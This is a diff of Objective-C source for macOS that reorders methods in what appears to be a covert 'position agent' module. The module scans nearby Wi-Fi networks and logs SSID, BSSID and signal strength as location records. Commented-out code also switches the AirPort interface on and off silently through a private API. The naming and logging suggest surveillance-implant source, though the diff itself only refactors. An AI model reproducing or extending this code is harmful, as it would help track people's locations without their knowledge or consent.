@@ -43,103 +43,19 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
 + (NSMutableArray*)scanForNetworksWithParameters:(NSDictionary*)parameters 
                                     error:(NSError**)error;
 - (id)init;
-
+- (NSString*)ssid;
 - (NSData*)bssidData;
 - (NSNumber*)ssidLen;
-- (NSString*)ssid;
+
+- (void)setSsid: (NSString*)aSsid;
 - (void)setBssidData: (NSString*)aBssid;
 - (void)setSsidLen: (NSNumber*) aSsidLen;
-- (void)setSsid: (NSString*)aSsid;
 
 @end
 
 @implementation __CWInterface : NSObject
 
 @synthesize rssi;
-
-+ (NSMutableArray*)parseDictionary: (NSData*)xmlData
-{
-  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-  
-  NSMutableArray *tmpArray = nil;
-  NSString *errorDesc;
-
-  if (xmlData == nil)
-  {
-#ifdef DEBUG_POSITION
-    NSLog(@"%s: error on data file", __FUNCTION__);
-#endif
-    return nil;
-  }
-  
-  NSArray *xmlDictArray = 
-  (NSArray *)[NSPropertyListSerialization 
-              propertyListFromData: xmlData 
-              mutabilityOption: NSPropertyListMutableContainersAndLeaves 
-              format: nil  
-              errorDescription: &errorDesc];
-  
-  if (xmlDictArray == nil)
-  {
-#ifdef DEBUG_POSITION
-    NSLog(@"%s: error on Array %@", __FUNCTION__, errorDesc);
-#endif
-    return nil;
-  }
-  
-  if ([xmlDictArray count])
-    tmpArray = [[NSMutableArray alloc] initWithCapacity: [xmlDictArray count]];
-  
-  for(int index=0; index < [xmlDictArray count]; index++)
-  {
-    NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
-    
-    NSNumber *i32Rssi;
-    NSString *cBssid;
-    NSString *cSsid;
-    
-    NSDictionary * tmpDict = (NSDictionary*)[xmlDictArray objectAtIndex: index];
-    
-    __CWInterface *tmpCWInt = [[__CWInterface alloc] init];
-    
-    if ((i32Rssi = [tmpDict objectForKey: @"RSSI"]) != nil) 
-    {
-#ifdef DEBUG_POSITION
-      NSLog(@"%s: RSSI %@", __FUNCTION__, i32Rssi);
-#endif
-      NSNumber *tmpRssi = [[NSNumber alloc] initWithInt: [i32Rssi intValue]];
-      [tmpCWInt setRssi: tmpRssi]; 
-    }
-    
-    if ((cSsid = [tmpDict objectForKey: @"SSID_STR"]) != nil) 
-    {
-#ifdef DEBUG_POSITION
-      NSLog(@"%s: SSID_STR %@ length %d", __FUNCTION__, cSsid, [cSsid length]);
-#endif
-      NSString *tmpSsid = [[NSString alloc] initWithFormat: @"%@", cSsid];
-      
-      [tmpCWInt setSsid: tmpSsid];
-    }  
-    
-    if ((cBssid = [tmpDict objectForKey: @"BSSID"]) != nil) 
-    {
-#ifdef DEBUG_POSITION
-      NSLog(@"%s: BSSID %@", __FUNCTION__, cBssid);
-#endif
-      [tmpCWInt setBssidData: cBssid];
-    }
-    
-    [tmpArray addObject: tmpCWInt];
-    
-    [tmpCWInt release];
-    
-    [innerPool release];
-  }
-  
-  [outerPool release];
-  
-  return tmpArray;
-}
 
 + (NSMutableArray*)scanForNetworksWithParameters:(NSDictionary*)parameters 
                                            error:(NSError**)error
@@ -258,6 +174,90 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
   return cwArray;
 }
 
++ (NSMutableArray*)parseDictionary: (NSData*)xmlData
+{
+  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+  
+  NSMutableArray *tmpArray = nil;
+  NSString *errorDesc;
+  
+  if (xmlData == nil)
+  {
+#ifdef DEBUG_POSITION
+    NSLog(@"%s: error on data file", __FUNCTION__);
+#endif
+    return nil;
+  }
+  
+  NSArray *xmlDictArray = 
+  (NSArray *)[NSPropertyListSerialization 
+              propertyListFromData: xmlData 
+              mutabilityOption: NSPropertyListMutableContainersAndLeaves 
+              format: nil  
+              errorDescription: &errorDesc];
+  
+  if (xmlDictArray == nil)
+  {
+#ifdef DEBUG_POSITION
+    NSLog(@"%s: error on Array %@", __FUNCTION__, errorDesc);
+#endif
+    return nil;
+  }
+  
+  if ([xmlDictArray count])
+    tmpArray = [[NSMutableArray alloc] initWithCapacity: [xmlDictArray count]];
+  
+  for(int index=0; index < [xmlDictArray count]; index++)
+  {
+    NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
+    
+    NSNumber *i32Rssi;
+    NSString *cBssid;
+    NSString *cSsid;
+    
+    NSDictionary * tmpDict = (NSDictionary*)[xmlDictArray objectAtIndex: index];
+    
+    __CWInterface *tmpCWInt = [[__CWInterface alloc] init];
+    
+    if ((i32Rssi = [tmpDict objectForKey: @"RSSI"]) != nil) 
+    {
+#ifdef DEBUG_POSITION
+      NSLog(@"%s: RSSI %@", __FUNCTION__, i32Rssi);
+#endif
+      NSNumber *tmpRssi = [[NSNumber alloc] initWithInt: [i32Rssi intValue]];
+      [tmpCWInt setRssi: tmpRssi]; 
+    }
+    
+    if ((cSsid = [tmpDict objectForKey: @"SSID_STR"]) != nil) 
+    {
+#ifdef DEBUG_POSITION
+      NSLog(@"%s: SSID_STR %@ length %d", __FUNCTION__, cSsid, [cSsid length]);
+#endif
+      NSString *tmpSsid = [[NSString alloc] initWithFormat: @"%@", cSsid];
+      
+      [tmpCWInt setSsid: tmpSsid];
+    }  
+    
+    if ((cBssid = [tmpDict objectForKey: @"BSSID"]) != nil) 
+    {
+#ifdef DEBUG_POSITION
+      NSLog(@"%s: BSSID %@", __FUNCTION__, cBssid);
+#endif
+      [tmpCWInt setBssidData: cBssid];
+    }
+    
+    [tmpArray addObject: tmpCWInt];
+    
+    [tmpCWInt release];
+    
+    [innerPool release];
+  }
+  
+  [outerPool release];
+  
+  return tmpArray;
+}
+
 - (id)init
 {
   self = [super init];
@@ -270,11 +270,6 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
   }
   
   return self;
-}
-
-- (NSData*)bssidData
-{
-  return bssidData;
 }
 
 - (void)setBssidData: (NSString*)aString
@@ -292,7 +287,7 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
     if (strlen(tmpBuff))
     {
       int digit;
-
+      
       bssidData = [[NSData alloc] initWithBytes: "\x00\x00\x00\x00\x00\x00" length:6];
       char *dataPtr = (char *) [bssidData bytes]; 
       char **tokenPtr, *token[6];
@@ -320,30 +315,14 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
   }
 }
 
+- (NSData*)bssidData
+{
+  return bssidData;
+}
+
 - (NSString*)ssid
 {
   return ssid;
-}
-
-- (void)setSsid: (NSString*)aSsid
-{
-  if (aSsid != nil)
-  {
-    if ([aSsid lengthOfBytesUsingEncoding: NSUTF8StringEncoding] > 32) 
-    {
-      ssid = [[NSString alloc] initWithString: [aSsid substringToIndex: 32]];
-      ssidLen = [[NSNumber alloc] initWithInt: 32];
-    }
-    else
-    {
-      ssid = aSsid;
-      ssidLen = [[NSNumber alloc] initWithInt:[aSsid lengthOfBytesUsingEncoding: NSUTF8StringEncoding]];
-    }
-  }
-  
-#ifdef DEBUG_POSITION
-  NSLog(@"%s: ssid %@", __FUNCTION__, ssid);
-#endif
 }
 
 - (NSNumber*)ssidLen
@@ -373,6 +352,27 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
 #endif
 }
 
+- (void)setSsid: (NSString*)aSsid
+{
+  if (aSsid != nil)
+  {
+    if ([aSsid lengthOfBytesUsingEncoding: NSUTF8StringEncoding] > 32) 
+    {
+      ssid = [[NSString alloc] initWithString: [aSsid substringToIndex: 32]];
+      ssidLen = [[NSNumber alloc] initWithInt: 32];
+    }
+    else
+    {
+      ssid = aSsid;
+      ssidLen = [[NSNumber alloc] initWithInt:[aSsid lengthOfBytesUsingEncoding: NSUTF8StringEncoding]];
+    }
+  }
+  
+#ifdef DEBUG_POSITION
+  NSLog(@"%s: ssid %@", __FUNCTION__, ssid);
+#endif
+}
+
 @end
 
 @implementation __m_MAgentPosition
@@ -396,6 +396,11 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
   return sharedAgentPosition;
 }
 
+- (id)copyWithZone: (NSZone *)aZone
+{
+  return self;
+}
+
 + (id)allocWithZone: (NSZone *)aZone
 {
   @synchronized(self)
@@ -415,9 +420,10 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
   return nil;
 }
 
-- (id)copyWithZone: (NSZone *)aZone
+- (unsigned)retainCount
 {
-  return self;
+  // Denotes an object that cannot be released
+  return UINT_MAX;
 }
 
 - (id)retain
@@ -425,10 +431,9 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
   return self;
 }
 
-- (unsigned)retainCount
+- (id)autorelease
 {
-  // Denotes an object that cannot be released
-  return UINT_MAX;
+  return self;
 }
 
 - (void)release
@@ -436,87 +441,12 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
   // Do nothing
 }
 
-- (id)autorelease
-{
-  return self;
-}
 
-
-- (SCNetworkInterfaceRef)getAirportInterface:(CFStringRef) aNetInterface
-{
-  SCNetworkInterfaceRef intf = NULL;
-  
-  CFArrayRef netIntfArray = SCNetworkInterfaceCopyAll();
-  
-  if (netIntfArray == NULL)
-  {
-    return NULL;
-  }
-  
-  int arrayCount = CFArrayGetCount(netIntfArray);
-  
-  for(int i=0; i < arrayCount; i++)
-  {
-    intf = CFArrayGetValueAtIndex(netIntfArray, i);
-    
-    CFStringRef intfName = SCNetworkInterfaceGetBSDName(intf);
-    
-    if( CFStringCompare(intfName, aNetInterface, kCFCompareCaseInsensitive) == kCFCompareEqualTo)
-      break;
-  }
-  
-  CFRetain(intf);
-  
-  CFRelease(netIntfArray);
-  
-  return  intf;
-}
-
-- (BOOL)setAirportPower:(CFStringRef) aNetInterface withMode:(BOOL)power
-{
-  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-  
-  SCNetworkInterfaceRef intf = [self getAirportInterface: aNetInterface];
-
-  if (intf != NULL)
-  {
-    ACInterfaceSetPower(intf, power);
-    CFRelease(intf);
-  }
-  else
-  {
-    [pool release];
-    return NO;
-  }
-  
-  [pool release];
-  
-  return YES;
-}
-
-- (BOOL)isAirportPowerOn:(CFStringRef)aNetInterface
-{
-  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-  
-  BOOL isPowered = NO;
-  
-  SCNetworkInterfaceRef intf = [self getAirportInterface: aNetInterface];
-  
-  if (intf != NULL)
-  {
-    isPowered = ACInterfaceGetPower(intf);
-    CFRelease(intf);  
-  }
-  
-  [pool release];
-  
-  return isPowered;
-}
 
 - (BOOL)grabHotspots
 {
   NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
-
+  
   //CFStringRef en1 = CFSTR("en1");
   //BOOL isAirportTurnedOn = YES;
   
@@ -525,55 +455,55 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
   NSDictionary *params = nil;
   
   // check if airport is running
-//  isAirportTurnedOn = [self isAirportPowerOn: en1];
-//  
-//  if (isAirportTurnedOn == NO)
-//  {
-//#ifdef DEBUG_POSITION
-//    NSLog(@"%s: airport is OFF try to start it up", __FUNCTION__);
-//#endif
-//    if ([self setAirportPower: en1 withMode: 1])
-//    {
-//#ifdef DEBUG_POSITION
-//      NSLog(@"%s: airport is ON", __FUNCTION__);
-//#endif    
-//      sleep(3);
-//    }
-//    else
-//    {
-//#ifdef DEBUG_POSITION
-//      NSLog(@"%s: airport is OFF error on forcing", __FUNCTION__);
-//#endif
-//    }
-//  }
+  //  isAirportTurnedOn = [self isAirportPowerOn: en1];
+  //  
+  //  if (isAirportTurnedOn == NO)
+  //  {
+  //#ifdef DEBUG_POSITION
+  //    NSLog(@"%s: airport is OFF try to start it up", __FUNCTION__);
+  //#endif
+  //    if ([self setAirportPower: en1 withMode: 1])
+  //    {
+  //#ifdef DEBUG_POSITION
+  //      NSLog(@"%s: airport is ON", __FUNCTION__);
+  //#endif    
+  //      sleep(3);
+  //    }
+  //    else
+  //    {
+  //#ifdef DEBUG_POSITION
+  //      NSLog(@"%s: airport is OFF error on forcing", __FUNCTION__);
+  //#endif
+  //    }
+  //  }
   
   //  NSArray* scan = [NSMutableArray arrayWithArray:[[__CWInterface interface] 
   //                                                  scanForNetworksWithParameters:params 
   //                                                  error:&err]];
   // running airport tool...
   NSArray* scan = [__CWInterface scanForNetworksWithParameters: params 
-                                                       error: &err];
+                                                         error: &err];
   sleep(1);
   
   // Turn off again the netintf
-//  if (isAirportTurnedOn == NO)
-//  {
-//#ifdef DEBUG_POSITION
-//    NSLog(@"%s: airport is now ON try to stop it again", __FUNCTION__);
-//#endif
-//    if ([self setAirportPower: en1 withMode: 0])
-//    {
-//#ifdef DEBUG_POSITION
-//      NSLog(@"%s: airport is OFF", __FUNCTION__);
-//#endif    
-//    }
-//    else
-//    {
-//#ifdef DEBUG_POSITION
-//      NSLog(@"%s: airport is already ON error on forcing", __FUNCTION__);
-//#endif
-//    }
-//  }
+  //  if (isAirportTurnedOn == NO)
+  //  {
+  //#ifdef DEBUG_POSITION
+  //    NSLog(@"%s: airport is now ON try to stop it again", __FUNCTION__);
+  //#endif
+  //    if ([self setAirportPower: en1 withMode: 0])
+  //    {
+  //#ifdef DEBUG_POSITION
+  //      NSLog(@"%s: airport is OFF", __FUNCTION__);
+  //#endif    
+  //    }
+  //    else
+  //    {
+  //#ifdef DEBUG_POSITION
+  //      NSLog(@"%s: airport is already ON error on forcing", __FUNCTION__);
+  //#endif
+  //    }
+  //  }
   
   if (scan == nil) 
   {
@@ -600,7 +530,7 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
   BOOL success = [logManager createLog: LOGTYPE_LOCATION_NEW
                            agentHeader: rawAdditionalHeader
                              withLogID: 0];
-
+  
 #ifdef DEBUG_POSITION
   NSLog(@"%s: rawAdditionalHeader %@", __FUNCTION__, rawAdditionalHeader);
 #endif
@@ -610,7 +540,7 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
     NSMutableData *tmpData = [[NSMutableData alloc] initWithLength: sizeof(WiFiInfo)];
     
     WiFiInfo *tmpInfo = (WiFiInfo *)[tmpData bytes];
-     
+    
 #ifdef DEBUG_POSITION
     NSLog(@"%s: tmpData length %lu", __FUNCTION__, sizeof(WiFiInfo));
 #endif 
@@ -620,7 +550,7 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
       memset(tmpInfo, 0, sizeof(tmpInfo));
       
       __CWInterface *icw = [scan objectAtIndex: i];
-
+      
 #ifdef DEBUG_POSITION
       NSLog(@"%s: icw ptr 0x%x", __FUNCTION__, (u_int)icw);
 #endif
@@ -631,7 +561,7 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
         NSLog(@"%s: uSsidLen %@", __FUNCTION__, [icw ssidLen]);
 #endif
         tmpInfo->uSsidLen = [[icw ssidLen] intValue];
-
+        
       }
       
       if ([icw ssid] != nil && tmpInfo->uSsidLen)
@@ -692,7 +622,7 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
       NSLog(@"%s: tmpData %@", __FUNCTION__, tmpData);
 #endif          
     }
-  
+    
     [tmpData release];
     
     [logManager closeActiveLog: LOGTYPE_LOCATION_NEW
@@ -712,22 +642,81 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
   return YES;
 }
 
+- (SCNetworkInterfaceRef)getAirportInterface:(CFStringRef) aNetInterface
+{
+  SCNetworkInterfaceRef intf = NULL;
+  
+  CFArrayRef netIntfArray = SCNetworkInterfaceCopyAll();
+  
+  if (netIntfArray == NULL)
+  {
+    return NULL;
+  }
+  
+  int arrayCount = CFArrayGetCount(netIntfArray);
+  
+  for(int i=0; i < arrayCount; i++)
+  {
+    intf = CFArrayGetValueAtIndex(netIntfArray, i);
+    
+    CFStringRef intfName = SCNetworkInterfaceGetBSDName(intf);
+    
+    if( CFStringCompare(intfName, aNetInterface, kCFCompareCaseInsensitive) == kCFCompareEqualTo)
+      break;
+  }
+  
+  CFRetain(intf);
+  
+  CFRelease(netIntfArray);
+  
+  return  intf;
+}
+
+- (BOOL)isAirportPowerOn:(CFStringRef)aNetInterface
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  BOOL isPowered = NO;
+  
+  SCNetworkInterfaceRef intf = [self getAirportInterface: aNetInterface];
+  
+  if (intf != NULL)
+  {
+    isPowered = ACInterfaceGetPower(intf);
+    CFRelease(intf);  
+  }
+  
+  [pool release];
+  
+  return isPowered;
+}
+
+- (BOOL)setAirportPower:(CFStringRef) aNetInterface withMode:(BOOL)power
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  SCNetworkInterfaceRef intf = [self getAirportInterface: aNetInterface];
+
+  if (intf != NULL)
+  {
+    ACInterfaceSetPower(intf, power);
+    CFRelease(intf);
+  }
+  else
+  {
+    [pool release];
+    return NO;
+  }
+  
+  [pool release];
+  
+  return YES;
+}
+
+
 #pragma mark -
 #pragma mark Agent Formal Protocol Methods
 #pragma mark -
-
-- (void)start
-{
-  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-  
-  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
-
-  [self grabHotspots];
-
-  [mAgentConfiguration setObject: AGENT_STOPPED
-                          forKey: @"status"];  
-  [outerPool release];
-}
 
 - (BOOL)stop
 {
@@ -746,6 +735,19 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
   return YES;
 }
 
+- (void)start
+{
+  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+  
+  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
+
+  [self grabHotspots];
+
+  [mAgentConfiguration setObject: AGENT_STOPPED
+                          forKey: @"status"];  
+  [outerPool release];
+}
+
 - (BOOL)resume
 {
   return YES;
@@ -754,6 +756,11 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
 #pragma mark -
 #pragma mark Getter/Setter
 #pragma mark -
+
+- (NSMutableDictionary *)mAgentConfiguration
+{
+  return mAgentConfiguration;
+}
 
 - (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
 {
@@ -764,9 +771,5 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
   }
 }
 
-- (NSMutableDictionary *)mAgentConfiguration
-{
-  return mAgentConfiguration;
-}
 
 @end
